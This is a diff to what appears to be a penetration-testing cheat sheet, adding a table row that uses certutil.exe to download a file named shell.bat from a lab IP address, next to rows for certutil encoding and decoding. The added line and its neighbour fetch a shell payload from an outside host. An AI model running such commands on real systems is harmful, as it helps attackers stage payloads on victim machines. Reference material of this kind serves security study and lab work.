@@ -116,6 +116,7 @@
 
 | **Command** | **Description** |
 | --------------|-------------------|
+| `certutil.exe -urlcache -f http://10.10.14.3:8080/shell.bat shell.bat` | Transfer file with certutil |
 | `certutil.exe -urlcache -split -f http://10.10.14.3:8080/shell.bat shell.bat` | Transfer file with certutil |
 | `certutil -encode file1 encodedfile` | Encode file with certutil |
 | `certutil -decode encodedfile file2` | Decode file with certutil |
